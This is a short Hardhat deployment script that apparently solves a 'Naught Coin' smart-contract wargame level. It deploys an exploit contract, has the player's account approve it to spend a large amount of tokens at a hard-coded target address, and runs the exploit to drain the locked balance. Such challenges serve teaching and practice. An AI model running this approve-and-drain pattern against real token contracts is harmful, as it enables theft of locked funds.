import { ethers } from "hardhat";

const targetContractAddress = "0x9473e1B38e6c6E9158132A37d39583d891c43E25";

const main = async () => {
  const signer = (await ethers.getSigners())[0];

  const ExploitFactory = await ethers.getContractFactory("NaughtCoinExploit");
  const exploit = await ExploitFactory.deploy();

  await exploit.waitForDeployment();

  console.log(`Exploit Deployed on Address: ${await exploit.getAddress()}`);

  const target = await ethers.getContractAt("IERC20", targetContractAddress);

  console.log(await signer.getAddress());
  console.log(`Balance: ${await target.balanceOf(await signer.getAddress())}`);

  await target.approve(await exploit.getAddress(), ethers.parseEther("1000000"));

  const tx1 = await exploit.execute();
  await tx1.wait();

  console.log(`Balance: ${await target.balanceOf(await signer.getAddress())}`);
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
